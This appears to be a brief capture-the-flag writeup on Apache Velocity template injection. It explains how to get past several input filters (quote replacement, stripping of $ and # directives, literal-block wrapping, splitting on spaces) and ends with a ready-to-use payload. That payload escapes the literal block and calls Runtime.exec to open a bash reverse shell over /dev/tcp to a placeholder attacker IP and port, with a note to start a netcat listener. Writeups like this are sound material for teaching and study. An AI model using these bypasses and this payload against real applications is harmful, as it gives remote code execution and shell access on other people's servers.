# Writeup

1. Velocity Template Injection
2. We need to bypass some Filters
---
> `.replaceAll("\"", "&quot;")`

Block quotes `"`, we use `'` only

---
> `.replaceAll("\\$\\w+", "")`

This can be bypassed by putting it in formal reference notation `${<payload>}`

---
> `.replaceAll("\\#\\w+", "")`

Block `#set`.

---
> `"#[[" + decoded + "]]#"`.

This is for literals so it won't be parsed by Velocity. Can easily bypassed by adding `]]#` in front of the payload.

---
> `username.split(" ")[0]`:

Only first word of username will be accepted. But can be bypassed by using url encode `%20`

3. Final PoC (Reverse Shell)

```
a]]#${class.inspect('java.lang.Runtime').type.getRuntime().exec('bash%20-c%20$@|bash%200%20echo%20bash%20-i%20>&%20/dev/tcp/[IPADDR]/[PORT]%200>&1').waitFor()}#[[x
```
Don't forget to change `[IPADDR]` and `[PORT]` with your nc listener